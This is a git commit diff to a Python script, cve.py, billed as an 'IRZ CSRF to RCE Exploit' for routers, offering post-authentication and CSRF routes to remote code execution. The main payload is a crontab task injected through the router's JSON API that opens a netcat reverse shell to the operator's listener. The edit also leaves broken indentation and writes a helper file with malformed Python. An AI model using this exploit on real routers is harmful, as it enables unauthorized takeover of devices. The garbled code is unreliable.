f22dd8480970b1d7ce871a4b1e8b31d2ca702575
marcspector <67823625+marcspector@users.noreply.github.com>
2022-03-17 19:19:59 -0500

    Update cve.py

--- cve.py
+++ cve.py
@@ -1,31 +1,37 @@
+
 import os
+import requests
 import json
 import subprocess
 
 option = "0"
 
 def main():
-    print("####################################################")
-    print("# Welcome to IRZ CSRF to RCE Exploit - version 1.0 #")
-    print("####################################################")
-    print()
-    print("## by redragon of WHG & rej_ex of SAKURA SAMURAI ##")
-    print()
-    print("1. Post Authentication RCE (Needs Credentials)")
-    print("2. CSRF to RCE (No Credentials)")
-    print()
-    runit()
-
+ print("####################################################")
+ print("# Welcome to IRZ CSRF to RCE Exploit - version 1.0 #")
+ print("####################################################")
+ print()
+ print("## by redragon of WHG & rej_ex of SAKURA SAMURAI ##")
+ print()
+ print("1. Post Authentication RCE (Needs Credentials)")
+ print("2. CSRF to RCE (No Credentials)")
+ print()
+ runit()
+   
 # Post Authentication RCE exploit
 
 def runit():
-	option = input("Select an option: ")    
-	if option == "1":
-		exploit1()
-	elif option == "2":
-		exploit2()
-	else: print("You must select '1' or '2'. Exiting.")
-     
+ option = input("Select an option: ")    
+  if option == "1":
+   exploit1()
+  elif option == "2":
+   exploit2()
+  else: 
+   print("You must select '1' or '2'. Exiting.")
+
+def subby():
+ os.system("gnome-terminal -x python3 nt.py")
+  
 def exploit1():
     print("## Running Post Auth RCE exploit")
     print()
@@ -39,14 +45,19 @@ def exploit1():
 
     LHOST = input("## Enter the LHOST for the router reverse shell: ")
     LPORT = input("## Enter the LPORT for the router reverse shell: ")
-    subprocess.call("nc -lvp " + str(LPORT), shell=True)
+    try:
+     with open('nt.py', 'w') as f:
+      f.write("import os\ndef main():\n os.system(nc -lvp " + str(LPORT) + ")\n main()")
+    except FileNotFoundError:
+     print("You had an error writing to the file, doesn't exist.")     
+    subby()
 
     router_url = f'http://{router_ip}:{router_port}'
-
+    
     send_json_payload(router_url, router_user, router_pass, LHOST, LPORT)
 
 def send_json_payload(router_url, router_user, router_pass, lhost_ip, lhost_port):
-
+    
     intro = f'Sending the payload to {router_url}\n'
     print(intro)
     payload_str = '{"tasks":[{"enable":true,"minutes":"*","hours":"*","days":"*","months":"*","weekdays":"*","command":"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ' + \
@@ -55,7 +66,8 @@ def send_json_payload(router_url, router_user, router_pass, lhost_ip, lhost_port
     
     payload_json = json.loads(payload_str)
 
-    s = s.session()
+    s = requests.Session()
+    
     s.auth = (router_user, router_pass)
 
     s.headers.update(
@@ -70,8 +82,6 @@ def send_json_payload(router_url, router_user, router_pass, lhost_ip, lhost_port
     
     print("Request sent! You may have to wait about 2 minutes to get a shell. \nFirst shell will die due to crontab job. Start a new listener on a new port [e.g. 443], and run the following command: " + exploit_str)
     print("To fix TTY: type telnet 0.0.0.0 in the shell")
-
-
 
 def exploit2():
     print("sup: ")
@@ -89,6 +99,5 @@ def load_csrf_poc_file():
         print(poc_data_str)
     else:
         print(f'{file_path} not found')
-
 
 main()
